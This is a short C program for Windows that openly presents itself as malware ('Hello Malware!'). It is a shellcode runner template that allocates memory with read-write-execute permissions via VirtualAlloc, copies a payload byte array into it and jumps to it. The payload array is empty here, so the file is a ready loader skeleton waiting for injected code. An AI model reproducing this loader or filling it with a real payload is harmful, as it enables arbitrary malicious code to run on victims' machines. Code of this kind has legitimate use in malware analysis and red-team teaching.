#include <stdio.h>
#include <windows.h>
unsigned const char payload[] = "";
size_t size = 0;
int main(int argc, char** argv) {    char* code;    printf("Hello Malware!n");
code = (char*)VirtualAlloc(NULL, size, MEM_COMMIT,PAGE_EXECUTE_READWRITE);  
memcpy(code, payload, size);
((void(*)())code)();
return(0);}